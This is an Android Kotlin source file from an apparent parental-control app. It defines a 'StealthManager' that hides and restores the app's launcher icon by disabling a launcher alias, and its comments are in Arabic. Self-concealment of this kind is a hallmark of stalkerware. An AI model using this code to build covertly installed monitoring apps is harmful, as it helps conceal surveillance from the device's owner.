package com.example.parentalcontrol

import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.util.Log

/**
 * مدير التخفي
 * يقوم بإخفاء أيقونة التطبيق من القائمة
 */
object StealthManager {

    private const val TAG = "StealthManager"

    /**
     * إخفاء أيقونة التطبيق من اللانشر
     */
    fun hideAppIcon(context: Context) {
        try {
            val pkg = context.packageManager
            val aliasName = ComponentName(context, "${context.packageName}.LauncherAlias")
            
            Log.d(TAG, "Attempting to hide: ${aliasName.flattenToString()}")
            
            pkg.setComponentEnabledSetting(
                aliasName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                0 // تم التغيير لضمان تحديث اللانشر فوراً في سامسونج
            )
            
            Log.i(TAG, "Launcher alias disabled successfully")
            
            // On some devices, we need to finalize the broadcast
            if (context is Activity) {
                context.finishAndRemoveTask()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to hide launcher icon: ${e.message}")
        }
    }

    /**
     * إظهار أيقونة التطبيق (لأغراض المعايرة أو الإعداد)
     */
    fun showAppIcon(context: Context) {
        try {
            val pkg = context.packageManager
            val aliasName = ComponentName(context, "${context.packageName}.LauncherAlias")
            
            Log.d(TAG, "Attempting to show: ${aliasName.flattenToString()}")
            
            pkg.setComponentEnabledSetting(
                aliasName,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            Log.i(TAG, "Launcher alias enabled successfully")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to show launcher icon: ${e.message}")
        }
    }

    /**
     * التحقق مما إذا كانت الأيقونة مخفية
     */
    fun isIconHidden(context: Context): Boolean {
        return try {
            val pkg = context.packageManager
            val aliasName = ComponentName(context, "${context.packageName}.LauncherAlias")
            val state = pkg.getComponentEnabledSetting(aliasName)
            state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
        } catch (e: Exception) {
            false
        }
    }
}
